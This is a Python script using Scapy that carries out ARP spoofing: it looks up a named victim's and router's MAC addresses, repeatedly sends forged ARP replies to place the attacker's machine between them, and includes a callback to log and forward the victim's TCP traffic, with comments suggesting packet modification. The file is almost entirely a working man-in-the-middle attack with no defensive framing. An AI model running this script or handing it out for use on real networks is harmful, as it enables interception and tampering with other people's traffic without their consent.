# arp_packet = ARP(
#     op=1,             # Operation code (1 for request, 2 for reply)
#     hwtype=1,        # Hardware type (1 for Ethernet)
#     ptype=2048,      # Protocol type (2048 for IPv4)
#     hwlen=6,         # Hardware address length (6 for Ethernet)
#     plen=4,          # Protocol address length (4 for IPv4)
#     hwsrc='00:00:00:00:00:00',  # Hardware source address (MAC)
#     psrc='192.168.1.1',  # Protocol source address (IP)
#     hwdst='ff:ff:ff:ff:ff:ff',  # Hardware destination address (MAC)
#     pdst='192.168.1.2'  # Protocol destination address (IP)
# )

from scapy.all import ARP, Ether, send, sniff, IP, TCP, srp

import os
import time

class Spoofer():
    def __init__(self):
        pass

# Replace these with your network settings
victim_ip = "192.168.1.82"  # Victim's IP address
router_ip = "192.168.1.254"  # Router's IP address
attacker_mac = "08:00:27:d1:42:d2"  # Attacker's MAC address

def get_mac(ip):
    """Get the MAC address of the given IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def arp_spoof(victim_ip,victim_mac, router_ip,router_mac, attacker_mac):
    """Send ARP spoofing packets to the victim and the router."""
    arp_response_victim = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwdst= router_mac, hwsrc=attacker_mac)
    arp_response_router = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwdst=victim_mac, hwsrc=attacker_mac)
    
    send(arp_response_victim, verbose=False)
    send(arp_response_router, verbose=False)

def restore_arp(victim_ip, router_ip, victim_mac, router_mac):
    """Restore the ARP tables."""
    arp_response_victim = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=router_mac)
    arp_response_router = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=victim_mac)
    
    send(arp_response_victim, count=5, verbose=False)
    send(arp_response_router, count=5, verbose=False)

def packet_callback(packet):
    """Callback function to handle captured packets."""
    if packet.haslayer(IP) and packet.haslayer(TCP):
        # Check if the packet is from the victim
        if packet[IP].src == victim_ip:
            print(f"Victim --> Router: {packet[IP].dst} | {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")

            # Modify packet if needed
            # packet[IP].dst = "NEW_DESTINATION_IP"  # Example modification

            # Forward the packet to the router
            send(packet, verbose=False)

        # Check if the packet is from the router
        elif packet[IP].dst == victim_ip:
            print(f"Router --> Victim: {packet[IP].src} | {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")

            # Modify packet if needed
            # packet[IP].src = "NEW_SOURCE_IP"  # Example modification

            # Forward the packet to the victim
            send(packet, verbose=False)

try:
    # Get the victim's MAC address
    victim_mac = get_mac(victim_ip)
    print("Victim mac:",victim_mac)
    # Get the router's MAC address
    router_mac = get_mac(router_ip)
    print("Router mac:",router_mac)

    if victim_mac is None or router_mac is None:
        print("Could not find MAC addresses. Ensure the devices are reachable.")
        exit(1)
    print("Starting ARP spoofing...")
    
    while True:
        arp_spoof(victim_ip,victim_mac, router_ip,router_mac, attacker_mac)
        time.sleep(2)  # Adjust the sleep time as needed
    

except KeyboardInterrupt:
    print("\nStopping ARP spoofing...")
    restore_arp(victim_ip, router_ip, victim_mac, router_mac)
